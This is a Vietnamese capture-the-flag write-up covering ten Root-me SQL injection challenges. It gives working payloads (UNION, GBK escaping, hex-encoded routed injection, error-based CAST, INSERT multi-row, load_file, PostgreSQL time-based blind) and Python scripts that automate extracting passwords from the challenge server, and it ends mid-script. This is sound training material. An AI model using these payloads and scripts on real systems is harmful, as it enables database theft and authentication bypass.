# C. Write up Root-me

**SQL Injection Challenges**

## [1. Authentication](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication)

![image](https://hackmd.io/_uploads/r1z_2mErp.png)

**Giải quyết :**

Ta được cung cấp cho giao diện đăng nhập người dùng, nhiệm vụ của ta là leak mật khẩu của `administrator`

Đầu tiên ta thử đăng nhập với payload như sau : 
**username** : `administrator'-- `
**password** : `123`

![image](https://hackmd.io/_uploads/r1-QK_7Sa.png)

Kết quả trả về thông báo không tìm thấy user 

![image](https://hackmd.io/_uploads/r1AEtumST.png)

Ta thử lại với username là `admin`

![image](https://hackmd.io/_uploads/BJ5uKdmrT.png)

Vậy là đã đăng nhập thành công, nhưng mật khẩu bị ẩn đi 

![image](https://hackmd.io/_uploads/HkV3F_QrT.png)

Ta vào source code để lấy flag

![image](https://hackmd.io/_uploads/Hkof5umrT.png)

Flag : t0_W34k!$    

## [2. GBK-Authentication](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication-GBK)

![image](https://hackmd.io/_uploads/rkAz2X4rp.png)


**Giải quyết:**

Ta được cung cấp giao diện đăng nhập như sau : 

![image](https://hackmd.io/_uploads/B19xp_QS6.png)

Challenge còn cung cấp thêm cho ta một thông tin sau : 

![image](https://hackmd.io/_uploads/H1sNp_QBT.png)

Thử nhập các payload cơ bản như :    

`admin'-- ` hoặc `a' or 1=1-- `

Nhưng kết quả ko thực sự trả về gì cả, chỉ trả về thông báo lỗi `Erreur d'identification`

Thử chuyển `login` và `password` sang kiểu array 

![image](https://hackmd.io/_uploads/ByAATmVHT.png)

Thì màn hình trả về thông báo lỗi như sau :   

![image](https://hackmd.io/_uploads/H1Nb0XNr6.png)

Có vẻ như trường `login` được bảo vệ bằng hàm `addslashes()` và trường `password` được bảo vệ bằng hàm `md5()`

Bây giờ ta test thử chức năng của các hàm này xem sao :    

Hàm `addslashes()` : 

![image](https://hackmd.io/_uploads/H1jF1E4Sa.png)

Hàm `md5()` : 

![image](https://hackmd.io/_uploads/r1lRJEESa.png)


**Nhận xét:**
- Hàm `addslashes()` thì thực hiện thêm các kí tự `\` vào trước các kí tự đặc biệt như `'` , `"` . Nên ta có thể tìm cách bypass trường login.
- Còn hàm md5() thực hiện hash value tạo ra một chuỗi hash cố định có độ dài cố định (32 ký tự hex). Nên ta ko thể khai thác được gì ở trường password.

**Phương hướng:**

Nhìn vào tiêu đề bài có vẻ như đã gợi cho chúng ta về `GBK` , có lẽ là hệ thống sẽ thực hiện convert Chinese GBK to Unicode lần cuối sau đó mới dùng username,password để đăng nhập người dùng.

`GBK` là một bảng mã ký tự (character encoding) sử dụng chủ yếu cho tiếng Trung. GBK mở rộng mã GB2312 và hỗ trợ cả ký tự giản thể và ký tự phồn thể trong tiếng Trung.

Các ký tự thuộc bảng mã ASCII và Latin (bao gồm tiếng Anh và các ngôn ngữ châu Âu) thường được biểu diễn bằng 1 byte.

Các ký tự Trung Quốc được biểu diễn bằng 2 byte.

**Ý tưởng :**
- Vì hàm `addslashes()` thì thực hiện thêm các kí tự `\` vào trước các kí tự đặc biệt như `'` :
  - `\' or 1=1-- `
- Nên ta phải kết hợp 1 kí tự nào đó để khi kết hợp với kí tự `\` -> GBK thì nó sẽ trở thành một kí tự trung quốc hợp lệ (2 byte) 

Ok , mình sẽ thử với các kí tự đặc biệt kết hợp với kí tự `\` để xem nó có thể convert thành chữ trung quốc hay không 

![15](https://hackmd.io/_uploads/r1tjKsNH6.png)


![17](https://hackmd.io/_uploads/BJMJcjVra.png)


Kết quả sau khi convert 

![18](https://hackmd.io/_uploads/Bk7eqsVST.png)

Vậy ta đã có thể bypass bằng cách kết hợp một kí tự đặt biệt (ngẫu nhiên) với kí tự `\` miễn làm sao để 2 kí tự này có thể convert GBK thành một kí tự Trung Quốc hợp lệ (2 byte)

Vậy cuối cùng payload sẽ như sau :    

![21](https://hackmd.io/_uploads/SkQz9jVHa.png)

**Kết quả :**    

![20](https://hackmd.io/_uploads/rJp75jEBa.png)

Flag : iMDaFlag1337!

## [3. String](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)

![22](https://hackmd.io/_uploads/S1zKF6NS6.png)

Đề bài cung cấp cho ta giao diện như sau :   

![image](https://hackmd.io/_uploads/SygZvCNHp.png)

Ta thử check form `login` trước : 

![image](https://hackmd.io/_uploads/ry-DPRVHT.png)

Thử các payload cơ bản nhưng không có dấu hiệu gì cả .

Tiếp tục thử chức năng `search` với payload `haha'` thì chương trình hiện ra thông báo lỗi 

![image](https://hackmd.io/_uploads/H1sCsRVHT.png)

Từ thông báo lỗi này ta nhận thấy trang web trang dùng hệ quản trị database `SQLite3` , và đây cũng chính là nơi mình có thể khai thác 

OK , Ý tưởng bây giờ là sử dụng UNION attack , đầu tiên ta xác định số cột có thể hiển thị như bằng các payload lần lượt như sau :    

`recherche=haha'+ORDER+BY+1--+-`

`recherche=haha'+ORDER+BY+2--+-`

`recherche=haha'+ORDER+BY+3--+-`

Đến payload thứ 3 thì bị lỗi , vậy xác định được số column có thể dùng UNION là 2.

Thử cả 2 column thì cho ra kết quả đều có thể khai thác với string với payload sau : 

`recherche=haha'UNION+SELECT+'a','b'--+-`

![image](https://hackmd.io/_uploads/Hkdd00Vra.png)


Tiếp tục tìm kiếm tên các table trong database (SQLite) với payload sau  :

`recherche=haha'UNION+SELECT+NULL,sql+FROM+sqlite_master--+-`

![image](https://hackmd.io/_uploads/rk4LJ1SS6.png)

Lúc này ta đã xác định được table `users` có 2 column là `username`, `password` chính là mục tiêu của chúng ta.

Bây giờ thử lấy ra `username`, `password` với payload sau : 

`recherche=haha'UNION+SELECT+username,password+FROM+users--+-`

Kết quả : 

![image](https://hackmd.io/_uploads/rkVvxJBrT.png)

Flag : c4K04dtIaJsuWdi

## [4. Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)

![image](https://hackmd.io/_uploads/HyGDXKBra.png)

Challenge cung cấp cho ta giao diện như sau : 

![image](https://hackmd.io/_uploads/ryQn7YSrT.png)

Thử check form đăng nhập với các payload cơ bản nhưng không có thông báo gì 

![image](https://hackmd.io/_uploads/HknREKrSp.png)

Ta tiếp tục thử với query string trên url thì phát hiện có thông báo lỗi trả về 

![image](https://hackmd.io/_uploads/BkINwtBBp.png)

Từ thông báo trả về này ta biết được trang web đang dùng SQLite3

Ok bây giờ ta check xem thử số column : 

...

`/web-serveur/ch18/?action=news&news_id=1+ORDER+BY+4--+-`

![image](https://hackmd.io/_uploads/Sy_K_YrST.png)

Từ đây suy ra số column là 3

Kiểm tra ta thấy được column thứ 2,3 có thể dùng để khai thác :    

![image](https://hackmd.io/_uploads/HkhK-WUBp.png)

Bây giờ kiểm tra các table được tạo

![image](https://hackmd.io/_uploads/SJ1zMZUHp.png)

Ở đây ta chỉ tập trung vào table `users` 

![image](https://hackmd.io/_uploads/SkAtzbLSp.png)

Vậy là đã có được flag

Flag : aTlkJYLjcbLmue3

## [5. Routed](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)

![image](https://hackmd.io/_uploads/HyjsgX_rT.png)

Như các chall ở trên thì đầu tiền chall cũng cung cấp cho ta form đăng nhập và dĩ nhiên là khi thử các payload cơ bản không trả về gì cả

![image](https://hackmd.io/_uploads/SJWmlQOSp.png)

Ta chuyển sang phần `Search` , thử với`'` 

![image](https://hackmd.io/_uploads/Hkx-mmdH6.png)

Ta nhận được thông bao lỗi 

![image](https://hackmd.io/_uploads/BkPVXQdHT.png)

Từ thông báo lỗi này có thể thấy trang web đang dùng database MariaDB (được phát triển dựa trên MySQL)

Bây giờ ta làm như các chall trước thì đã bị filter `Attack detected`

![image](https://hackmd.io/_uploads/rkb1SQdHa.png)

Nhìn vào đề bài bài ta thử search `SQL Injection - Routed` , thì mình có đọc được một [bài viết](https://www.securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html) giải thích khá kĩ. Đại khái thì ouput của query 1 sẽ là input cho query 2. 

Hãy xem và suy ngẫm từ đoạn code dưới đây là hiểu nhé : 

```php=
<?php
// Lấy tham số 'id' từ URL
$id = $_GET['id'];

// Tạo câu truy vấn SQL đầu tiên để lấy 'id' và 'sec_code' từ bảng 'users'
$query = "SELECT id, sec_code FROM users WHERE id='$id'";


if (!$result = mysql_query($query, $conn)) {
    die("Lỗi trong quá trình chọn dữ liệu: " . mysql_error());
}


if (mysql_num_rows($result) == 0) {
    die();
}

// Lấy kết quả
$row = mysql_fetch_array($result, MYSQL_ASSOC);

// Tạo câu truy vấn SQL thứ hai để lấy 'username' từ bảng 'users' dựa trên 'sec_code'
$query = "SELECT username FROM users WHERE sec_code='" . $row['sec_code'] . "'";


echo "<br><font color=red>Đây là câu truy vấn trả về: </font>$query<br><br>";


if (!$result = mysql_query($query, $conn)) {
    die("Lỗi trong quá trình chọn dữ liệu: " . mysql_error());
}


if (mysql_num_rows($result) == 0) {
    die("Tham số đầu vào không hợp lệ");
}


$row = mysql_fetch_array($result, MYSQL_ASSOC);


echo 'Tên người dùng là: ' . $row['username'] . "<br>";
?>

```

Đoạn code trên sẽ hởi khác với chall nhưng về bản chất là như vậy

Tiến hành thử nghiệm : 

![image](https://hackmd.io/_uploads/SJHRK7OHa.png)


![image](https://hackmd.io/_uploads/HkgTkqmuS6.png)


![image](https://hackmd.io/_uploads/S1TecXdrT.png)

Quả thật output từ query 1 đã chuyển vào input cho query 2

Sau khi đã hiểu SQL Injection Routed là gì thì ta tiếp tục thử payload để xác định số column :    

`'UNION SELECT ' ORDER BY 2 -- - -- -`

![image](https://hackmd.io/_uploads/Hywmt7_rT.png)

Kết quả vẫn bị filter , sau khi tham khảo trên gg thì để bypass được ta cần đổi sang dạng hex , vậy payload sẽ như sau : 

`'UNION SELECT 0x27204f524445522042592032202d2d202d -- -`

Tiếp tục : 

`'UNION SELECT ' ORDER BY 3 -- - -- -`

-> `'UNION SELECT 0x27204f524445522042592033202d2d202d -- -`

Kết quả trả về không tìm thấy column 3 , vậy số column là 2 

![image](https://hackmd.io/_uploads/HJr8h7uSp.png)

Tiếp tục tìm table_name :    

`' UNION SELECT ' UNION SELECT NULL,group_concat(TABLE_NAME) FROM information_schema.tables WHERE table_schema = database() -- - -- -`

-> `'UNION SELECT 0x2720554e494f4e2053454c454354204e554c4c2c67726f75705f636f6e636174285441424c455f4e414d45292046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c6573205748455245207461626c655f736368656d61203d2064617461626173652829202d2d202d -- -`

Kết quả trả về table `users`

![image](https://hackmd.io/_uploads/H1YmCXura.png)

Từ đây ta tiếp tục khai thác các column trong table `users` với payload :  

`'UNION SELECT ' UNION SELECT NULL,group_concat(COLUMN_NAME) FROM information_schema.columns WHERE table_name = 'users' -- - -- -`

-> `'UNION SELECT 0x2720554e494f4e2053454c454354204e554c4c2c67726f75705f636f6e63617428434f4c554d4e5f4e414d45292046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73205748455245207461626c655f6e616d65203d2027757365727327202d2d202d -- -`

Kết quả trả về 4 column nhưng ta chỉ quan tâm 2 column là `login` và `password` 

![image](https://hackmd.io/_uploads/HJ9VkN_rT.png)

Vậy bước cuối cùng là lấy password và submit thôi :    
`'UNION SELECT ' UNION SELECT NULL,group_concat(login,' ~ ',password) FROM users -- - -- -`

-> `'UNION SELECT 0x2720554e494f4e2053454c454354204e554c4c2c67726f75705f636f6e636174286c6f67696e2c27207e20272c70617373776f7264292046524f4d207573657273202d2d202d -- -`

Yee , vậy là ta đã tìm được flag :    

![image](https://hackmd.io/_uploads/H1I6JEuBp.png)

Flag : qs89QdAs9A

## [6. Truncation](https://www.root-me.org/en/Challenges/Web-Server/SQL-Truncation)

![image](https://hackmd.io/_uploads/S1dS6juBa.png)

![image](https://hackmd.io/_uploads/BkehTj_HT.png)

![image](https://hackmd.io/_uploads/HkY36o_Ba.png)

Bài này thuộc dạng SQL Truncation , nhưng không phải func TRUNCATE trong SQL :v 

Hiểu nôm na là một column khi được tạo sẽ quy định max bao nhiêu kí tự đó. Nếu khi thêm giá trị vào column mà vượt quá giá trị max thì nó sẽ tự động cắt đi số kí tự vượt quá :-1: 

Giả sử column `username` có max là `10 kí tự` nếu ta nhập vào`15 kí tự` thì nó sẽ tự động cắt đi `5 kí tự` cuối cùng

**Note** giả sử trong `10 kí tự` còn lại sau khi bị cắt gồm : 
- `5 kí tự đầu` là `admin`
- `5 kí tự cuối` là khoảng trắng

Thì kết quả cuối cùng là `admin` , bởi vì các dấu khoảng trắng phía sau sẽ bị bỏ qua (nếu ko có kí tự nào phía sau kí tự khoảng trắng)

Bonus : trong `View page source` đề bài có gợi ý cho ta số kí tự tối đa của mỗi cột 

![image](https://hackmd.io/_uploads/BJ-WlhdBa.png)

TỪ NHỮNG GÌ ĐƯỢC NÊU RA Ở TRÊN THÌ TA GIẢI QUYẾT BÀI NÀY NHƯ SAU : 

Ta cần truy cập được vào user `admin` 

Đầu tiên thì phải đăng kí tài khoản với username là `admin`, nhưng khi đăng kí thì ta được thông báo là user `admin` đã tồn tại

Do vậy ta phải tìm cách đăng kí vẫn dưới tên `admin` nhưng với một mật khẩu khác bằng phần lý thuyết đã nêu ở đầu bài

Ta biết giá trị column `login` có tối đa là 12 kí tự. Do vậy, ta sẽ thêm 7 kí tự khoảng trắng và 1 kí tự ngẫu nhiên nào đó . 

Khi đó kí tự ngẫu nhiên ta thêm vào ở vị trí thứ 13 sẽ bị cắt, kết quả còn  `admin` với 7 kí tự khoảng trắng phía sau , mà kí tự chỉ toàn khoảng trắng phía sau sẽ tự động được bỏ qua. Cuối cùng ta tạo được user `admin` với mật khẩu mong muốn 

![image](https://hackmd.io/_uploads/r1Lf7n_B6.png)

![image](https://hackmd.io/_uploads/HyQN7h_Ba.png)

Bây giờ nhập mật khẩu ta đã tạo sẽ lấy được flag

![image](https://hackmd.io/_uploads/HkFLXhuBT.png)

![image](https://hackmd.io/_uploads/ryov73dHT.png)

Flag : J41m3Qu4nD54Tr0nc

## [7. Error](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)

![image](https://hackmd.io/_uploads/B1do7hOS6.png)


![image](https://hackmd.io/_uploads/HkDJ4nOrp.png)


![image](https://hackmd.io/_uploads/HJ36m3dBT.png)
    
Và giống như các chall ở trên thì form login ta không thể khai thác được gì cả 

Nhưng ta có thể khai thác với phần params trên URL , khi thêm vào một dấu `'` 

![image](https://hackmd.io/_uploads/r1ZFswYS6.png)

Từ thông báo lỗi trên ta thấy được ta đang ở trong `ORDER BY` CLAUSE. Và bài này thuộc dạng sẽ hiện thị lỗi ra màn hình nên ta có thể thử với hàm ép kiểu dữ liệu như `CAST,..,`

Bây giờ thử thực hiện ý tưởng

`ASC,CAST((SELECT+table_name+FROM+information_schema.tables)+AS+int)+--+-`

![image](https://hackmd.io/_uploads/rJZVkOFra.png)

Kết quả trả về nhiều hơn 1 dòng cho nên ta sẽ dùng `LIMIT` để giới hạn

`ASC,CAST((SELECT+table_name+FROM+information_schema.tables+LIMIT+0,1)+AS+int)+--+-`

- Ở đây mình bắt đầu từ vị trí 0 và lấy 1 (trong code thì vị trí bắt đầu là 0)

![image](https://hackmd.io/_uploads/r1bfguFST.png)

yah cú pháp `LIMIT #,#` ko được hỗ trợ , và đề gợi ý cho chúng ta là dùng `LIMIT` và `OFFSET` 
- `OFFSET` cũng là lấy từ vị trí mà ta muốn

Bây giờ thử lại với vị trí 0

`ASC,CAST((SELECT+table_name+FROM+information_schema.tables+LIMIT+1+OFFSET+0)+AS+int)+--+-`

![image](https://hackmd.io/_uploads/HkGU-_tHT.png)

Một phát ăn ngay , giả dụ mình làm tới 3 mà ko tìm thấy thì nên dùng tính nắng intruder trong burp suit hoặc code python :3 

Code python tham khảo như sau :     
```python=
import sys
import requests
import urllib3
import urllib

# Tắt cảnh báo không an toàn của urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Cài đặt proxy để theo dõi và ghi lại các request và response qua mạng
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

URL = "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC"

for i in range(0,50):
	query ='ASC, (CAST((select table_name from information_schema.tables limit 1 offset ' + str(i) + ') as int)) -- -'
	PARAMS ={'action':'contents','order':query}
	http  = requests.get(url = URL,params = PARAMS,verify=False,proxies=proxies)
	content = http.text
	content = content.replace("</body></html>","")
	#print(content)
	ans = "ERROR:  invalid input syntax for integer:"
	position = content.find(ans) + len(ans)
	#print(position)
	print ("table_name is :" + content[position:])
```

![image](https://hackmd.io/_uploads/S19j1KKH6.png)


Đã tìm được table_name là `m3mbr35t4bl3` rồi tiếp theo tiếp tục với column_name 

```python=
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

URL = "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC"

for i in range(0,50):
	query ='ASC, (CAST((select column_name from information_schema.columns limit 1 offset ' + str(i) + ') as int)) -- -'
	PARAMS ={'action':'contents','order':query}
	http  = requests.get(url = URL,params = PARAMS,verify=False,proxies=proxies)
	content = http.text
	content = content.replace("</body></html>","")
	ans = "ERROR:  invalid input syntax for integer:"
	position = content.find(ans) + len(ans)
	print ("column_name is :" + content[position:])
```
Kết quả tìm được `us3rn4m3_c0l` , `p455w0rd_c0l`

![image](https://hackmd.io/_uploads/rJMKxtYS6.png)

Oke bây giờ ta tiếp tục tìm xem user `admin` ở vị trí thứ bao nhiêu 

`ASC,CAST((SELECT+us3rn4m3_c0l+FROM+m3mbr35t4bl3+LIMIT+1+OFFSET+0)+AS+int)+--+-`

Thử với `OFFSET 0` thì may quá 1 phát ăn ngay, nếu ko được thì có thể viết code python như các phần trên.

![image](https://hackmd.io/_uploads/r1Dr7tYrp.png)

Phần còn lại là lấy password thui 

![image](https://hackmd.io/_uploads/SysdQttST.png)

Flag : 1a2BdKT5DIx3qxQN3UaC

## [8. Insert](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Insert)

![image](https://hackmd.io/_uploads/HJ-fVCFHa.png)

Với chall này yêu cầu đề bài không giống bài trước là đi tìm mật khẩu của admin , mà là lấy flag hmmm...

Và dựa vào tiêu đề thì có vẻ đây là một lỗ hổng liên quan đến `Insert`. Có lẽ là chức năng `INSERT` không có bất kì filter nào .

Ví dụ : INSERT INTO users VALUES (username, password, email)

![image](https://hackmd.io/_uploads/BkUzBRtHp.png)

![image](https://hackmd.io/_uploads/rJkmHRKBa.png)

![image](https://hackmd.io/_uploads/SJvVrAtHT.png)

Ý tưởng là thực hiện exploit với **Multiple Insertions**

**Payload**: INSERT INTO users VALUES (username, password, email), (new_user,new_passwd, attack_payload)-- -

Đầu tiên kiểm tra version : 

![image](https://hackmd.io/_uploads/SyOJ869ST.png)



![image](https://hackmd.io/_uploads/rk8QUp9rT.png)

Vậy ta vẫn có thể dùng cú pháp trong MySQL để payload 

Bởi vì chall thì phải thực hiện register, login nhiều lần nên mình viết code cho nhanh

Đầu tiên thì tìm tên table trước

```python=
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def In_Ket_Qua(content,cnt):
    to_replace = ['<br />', '</body>', '</html>', '\n']
    for tag in to_replace:
        content = content.replace(tag, "")
    p = content.find("Email :") + len("Email :")
    print(cnt, "-", content[p:])

def main():
    offset = 0
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    URL_reg = "http://challenge01.root-me.org/web-serveur/ch33/?action=register"
    URL_log = "http://challenge01.root-me.org/web-serveur/ch33/?action=login"
    for i in range(1000, 2000):
        reg = {"username": f"{i - 1}", "password": f"{i - 1}","email": f"{i - 1}'),('{i}','{i}',(select table_name from information_schema.tables limit {offset},1))-- -"}
        log = {"username": f"{i}", "password": f"{i}"}
        http_reg = requests.post(url=URL_reg, data=reg, verify=False, proxies=proxies)
        if "You can logged in !" in http_reg.text:
            http_log = requests.post(url=URL_log, data=log, verify=False, proxies=proxies)
            r = http_log.text
            In_Ket_Qua(r,offset)
            offset += 1

if __name__ == "__main__":
    main()
```

![image](https://hackmd.io/_uploads/B1qkfAqHa.png)


Ok vậy ta đã tìm được table flag ở vị trí thứ 79, tiếp theo là tìm column_name
- Sử dụng code tương tự ở trên , nhưng nhớ đổi khoảng range(#,#) để username không bị trùng với ở trên nha

![image](https://hackmd.io/_uploads/rkIcKyoBp.png)

Kết quả

![image](https://hackmd.io/_uploads/rkJtFyjH6.png)

Cuối cùng là lấy flag thuiii

![image](https://hackmd.io/_uploads/HJy39ysH6.png)

![image](https://hackmd.io/_uploads/HkN6cJiH6.png)

Flag : moaZ63rVXUhlQ8tVS7Hw

## [9. File reading](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-File-reading)

![image](https://hackmd.io/_uploads/BygVzZ2S6.png)

![image](https://hackmd.io/_uploads/ry_8fW3rp.png)

![image](https://hackmd.io/_uploads/ByPjz-2ra.png)

Đầu tiên ta inject kí tự `'` để tìm ra nơi có thể exploit 

![image](https://hackmd.io/_uploads/ByvJTxnB6.png)

![image](https://hackmd.io/_uploads/ByaL8Z3Bp.png)

Dựa vào ảnh trên ta đoán được rằng câu lệnh trên hệ thống được viết như sau :     

`"SELECT * FROM table_name WHERE column_name=$id"`

Do vậy ta có thể exploit dễ dàng, check số column 

![image](https://hackmd.io/_uploads/BJwU7f2rT.png)

![image](https://hackmd.io/_uploads/rJRvXMnBa.png)


OK vậy số column là 4

![image](https://hackmd.io/_uploads/ry5ONz2H6.png)

Kết hợp với điều kiện luôn sai `1=0` để để hiện thị thông tin theo ý ta 

![image](https://hackmd.io/_uploads/HkgUpHfnBp.png)

Vậy các cột ta có thể exploit được là 1,2,4

Tên bài là file reading, ta có thể đoán rằng, tất cả sẽ nằm trong source code tại `index.php`.

- Lưu ý đường dẫn tuyệt đối tới file trong rootme là “/challenge/web-serveur/ch31/index.php”

Ta sẽ dùng hàm load_file() để ta render file đó ra. Vậy payload như sau : 

`1+AND+1=0+UNION+SELECT+1,2,3,load_file(/challenge/web-serveur/ch31/index.php)--+-`

![image](https://hackmd.io/_uploads/H1xUdf2rT.png)

Có vẻ đường dẫn bị chặn nên ta thử chuyển đường dẫn sang mã hex : 

`1+AND+1=0+UNION+SELECT+1,2,3,load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870)--+-`

![image](https://hackmd.io/_uploads/S1rDKGnra.png)

Click chuột phải vào `View page source` ta xem được source đầy đủ. Từ code ta có thể thấy được table cần khai thác có tên là `member` có các column `member_login` , `member_password` , trong đó `member_password` bị mã hóa. Do vậy ta phải thực hiện decode để ra password ban đầu.

![image](https://hackmd.io/_uploads/SkeDnS2r6.png)

![image](https://hackmd.io/_uploads/BJP93S3Hp.png)


Oke bây giờ trước cứ lấy password ra đã

![image](https://hackmd.io/_uploads/ByqdTr2BT.png)

Password : `VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==`

Dựa vào những thông tin sau :  

`$pass = sha1($_POST['password']);`

`if($pass == stringxor($key, base64_decode($data['member_password'])))`

Nghĩa là giá trị ta nhập vào (`$_POST['password']`) sẽ được mã hóa `sha1` , và nếu giá trị đó mà bằng `stringxor($key, base64_decode($data['member_password']))` thì có nghĩa là mật khẩu nhập vào là đúng.

Mà ta lại có giá trị của `member_password` rồi thì bây giờ thực hiện các bước ngược lại để lấy flag thôi .

Đầu tiên tìm giá trị của `stringxor($key, base64_decode($data['member_password'])`

![image](https://hackmd.io/_uploads/S1n1YI2Bp.png)

Cuối cùng encrypt `sha1` là xong 

![image](https://hackmd.io/_uploads/BJaMFUhST.png)

Flag : superpassword

## [10. Time based](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)

![image](https://hackmd.io/_uploads/HyMZPonST.png)

Vì bài này thuộc dạng SQL time delay nên ta cần tìm nơi có thể exploit bằng time delay

Form login thì chắc chắn ko được nên ở đây là có khả năng nhất 

![image](https://hackmd.io/_uploads/Hyfovs3Ba.png)

Rôi bây giờ cùng thử các lệnh khác nhau của nhiều hệ database để xem thử kết quả

![image](https://hackmd.io/_uploads/BJzkOi2ra.png)

Thử nghiệm giả thuyết

![image](https://hackmd.io/_uploads/HyC4ushST.png)


![image](https://hackmd.io/_uploads/SJ2StohS6.png)

Để ý ở góc phải cuối màn hình thì ta thấy chỉ có PostgreSQL là có thời gian response chậm nhất `~ 2 giây` , còn các database khác thì chỉ `~ 0,3 s`

Ta đã biết hệ thống dùng database gì rồi bây giờ bắt đầu exploit, payload như sau :- 

`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END-- -`

Đầu tiên check Length của table name trước, viết code python check cho nhanh nhé :

```python=
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def main():
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    URL = "http://challenge01.root-me.org/web-serveur/ch40/"
    for i in range(1, 30):
        payload = f"1;SELECT CASE WHEN ((SELECT LENGTH(table_name) FROM information_schema.tables limit 1)={i}) THEN pg_sleep(10) ELSE pg_sleep(0) END-- -"
        PARAMS = {"action": "member", "member":payload}
        http = requests.get(url=URL,params=PARAMS, verify=False, proxies=proxies)
        if (http.elapsed.total_seconds()) >= 2:
            sys.stdout.write('\r' + 'Length table_name is ' + str(i))
            sys.stdout.flush()
            break
        else:
            sys.stdout.write('\r' + str(i))
            sys.stdout.flush()

if __name__ == "__main__":
    main()
```

![image](https://hackmd.io/_uploads/BkyYun3Bp.png)

- Ở đây mình cũng không hiểu tại sao mình sleep(10) nhưng nó thực tế chỉ tối đa là 2,7 đến 2,8 giây :v 

Ta đã biết được length rồi , bây giờ dò table_name. Thay đổi đoạn code ở trên 1 xí thành như sau : 

```python=
    table_name=""
    for i in range(1, 6):
        for j in range (32,126):
            payload = f"1;SELECT CASE WHEN (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables limit 1),{i},1))={j}) THEN pg_sleep(10) ELSE pg_sleep(0) END-- -"
            PARAMS = {"action": "member", "member": payload}
            http = requests.get(url=URL, params=PARAMS, verify=False, proxies=proxies)
            if (http.elapsed.total_seconds()) >= 2:
                table_name += chr(j)
                sys.stdout.write('\r' + table_name)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + table_name + chr(j))
                sys.stdout.flush()
```

![image](https://hackmd.io/_uploads/rJ6a963Bp.png)

Có được table_name là `users` , tiếp tục tìm với column_name, vì mình lười nên sẽ viết code để làm cho nhanh nhé : 

```py=
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
URL = "http://challenge01.root-me.org/web-serveur/ch40/"

def lenght_column_name(offset):
    for i in range(1, 30):
        payload = f"1;SELECT CASE WHEN ((SELECT LENGTH(column_name) FROM information_schema.columns limit 1 offset {offset})={i}) THEN pg_sleep(10) ELSE pg_sleep(0) END-- -"
        PARAMS = {"action": "member", "member": payload}
        http = requests.get(url=URL, params=PARAMS, verify=False, proxies=proxies)
        if int((http.elapsed.total_seconds())) >= 2:
            return i

def columns_name():
    # 10 column đầu tiên
    for k in range (0,10):
        length = lenght_column_name(k)
        if length is None:
            continue
        column_name = ''
        print(f"Colum tại offset {k} có LEGHTH là {length} kí tự, tiếp tục tìm tên column ,loading...")
        for i in range(1, length + 1):
            for j in range(97, 123):
                payload = f"1;SELECT CASE WHEN (ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns limit 1 offset {k}),{i},1))={j}) THEN pg_sleep(10) ELSE pg_sleep(0) END-- -"
                PARAMS = {"action": "member", "member": payload}
                http = requests.get(url=URL, params=PARAMS, verify=False, proxies=proxies)
                if int((http.elapsed.total_seconds())) >= 2:
                    column_name += chr(j)
                    sys.stdout.write('\r' + 'Kết quả là: ' + column_name)
                    sys.stdout.flush()
                    break
                else:
                    sys.stdout.write('\r' + 'Kết quả là: ' +column_name + chr(j))
                    sys.stdout.flush()
        print("\n")

if __name__ == "__main__":
    columns_name()
```
- Ở đây mình chỉ duyệt các kí tự chữ cái in thường (97-122) cho nhanh , còn nếu muốn làm tổng quát hơn thì sẽ là (32-126)

Kết quả : 

![image](https://hackmd.io/_uploads/H1UeZ1prT.png)

Mình chỉ cần quan tâm 2 column là `username` và `password`. Admin có id=1, ta chỉ cần tìm kiếm với offset = 0 là sẽ ra.

![image](https://hackmd.io/_uploads/rythmkaHT.png)

Code dò password tương tự như trên thôi

```python=
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
URL = "http://challenge01.root-me.org/web-serveur/ch40/"

def lenght_passwd(offset):
    for i in range(1, 100):
        payload = f"1;SELECT CASE WHEN ((SELECT LENGTH(password) FROM users limit 1 offset {offset})={i}) THEN pg_sleep(10) ELSE pg_sleep(0) END-- -"
        PARAMS = {"action": "member", "member": payload}
        http = requests.get(url=URL, params=PARAMS, verify=False, proxies=proxies)
        if int((http.elapsed.total_seconds())) >= 2:
            return i

def passwd():
    length = lenght_passwd(0)
    password = ''
    print(f"Password có {length} kí tự , đang dò password , loading ...  ")
    for i in range(1, length + 1):
        for j in range(32, 126):
